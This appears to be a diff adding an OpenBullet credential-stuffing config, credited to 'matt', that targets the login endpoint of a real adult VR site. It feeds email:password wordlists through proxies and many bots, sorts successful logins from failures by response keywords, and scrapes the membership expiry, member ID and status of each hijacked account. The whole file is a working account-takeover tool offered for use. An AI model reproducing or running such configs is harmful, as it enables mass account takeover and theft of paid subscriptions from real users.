@@ -1,0 +1,78 @@
+[SETTINGS]
+{
+  "Name": "Vrbangers.com by matt",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-01T18:00:58.8311722+02:00",
+  "AdditionalInfo": "Special thanks ehsanef for providing premium to me <3",
+  "Author": "matt",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://vrbangers.com/wp-admin/admin-ajax.php" 
+  CONTENT "user_password=<PASS>&rememberme=forever&wp-submit=Log+in&redirect_to=https%3A%2F%2Fvrbangers.com%2Fmain-dashboard%2F&nonce=1a69c89326&forgotsecurity=9f32e58c2a&_wp_http_referer=%2Fwp-admin%2Fadmin-ajax.php&action=login_me&user_email=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Host: vrbangers.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 261" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Origin: https://vrbangers.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Referer: https://vrbangers.com/login/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+#Check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "success\":false" 
+    KEY "incorrect_password_ajax" 
+    KEY "The password wasn't quite right" 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+
+#Check REQUEST GET "https://vrbangers.com/main-dashboard/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Expiry PARSE "<SOURCE>" LR "left\">Expiry:</div><div class=\"user-info-item-right\">" "</div" -> CAP "Expiry" 
+
+#ID PARSE "<SOURCE>" LR "left\">Member ID:</div><div class=\"user-info-item-right\">" "</div>" -> CAP "ID" 
+
+#Fix FUNCTION Translate 
+  KEY "<br>" VALUE "" 
+  "<ID>" -> CAP "ID" 
+
+#Status PARSE "<SOURCE>" LR "left\">Status:</div><div class=\"user-info-item-right\">" "</div>" -> CAP "Status" 
+
+#Membership PARSE "<SOURCE>" LR "Membership:</div><div class=\"user-info-item-right\">" "</div>" -> VAR "Membership" 
+
+#Fix FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "<br>" VALUE "" 
+  "<Membership>" -> VAR "Membership" 
+
+#By PARSE "<Membership>" LR "" "" -> CAP "Membership" "" " | by matt" 
+
